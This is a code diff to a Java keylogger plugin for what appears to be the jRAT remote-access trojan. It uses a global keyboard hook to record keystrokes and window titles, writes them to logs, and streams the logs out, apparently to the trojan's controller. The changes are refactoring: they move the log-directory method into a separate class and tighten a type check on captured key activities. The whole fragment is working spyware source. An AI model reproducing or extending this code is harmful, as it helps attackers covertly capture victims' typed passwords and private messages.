@@ -6,13 +6,16 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileWriter;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 
 import org.jnativehook.GlobalScreen;
 
 import pro.jrat.api.stub.StubPlugin;
+import pro.jrat.plugin.stub.activities.Activities;
+import pro.jrat.plugin.stub.activities.Activity;
+import pro.jrat.plugin.stub.activities.Key;
+import pro.jrat.plugin.stub.activities.Title;
 
 public class KeyloggerPlugin extends StubPlugin {
 
@@ -57,7 +60,7 @@ public class KeyloggerPlugin extends StubPlugin {
 				}
 			}
 		} else if (header == LOGS_HEADER) {
-			File[] years = getLogsRoot().listFiles();
+			File[] years = Keylogger.getLogsRoot().listFiles();
 			
 			dos.writeByte(LOGS_HEADER);
 			
@@ -147,7 +150,7 @@ public class KeyloggerPlugin extends StubPlugin {
 						for (Activity a : Activities.activities) {
 							if (a instanceof Title) {
 								out.println("\n\r" + a.toString() + "\n\r\n\r");
-							} else {
+							} else if (a instanceof Key) {
 								out.println(((Key)a).getChar());
 							}
 						}
@@ -159,11 +162,5 @@ public class KeyloggerPlugin extends StubPlugin {
 				}
 			}	
 		}).start();
-	}
-	
-	public static File getLogsRoot() {
-		File file = new File(System.getProperty("user.home") + "\\Desktop\\LOGSTEST\\");
-		file.mkdirs();
-		return file;
 	}
 }
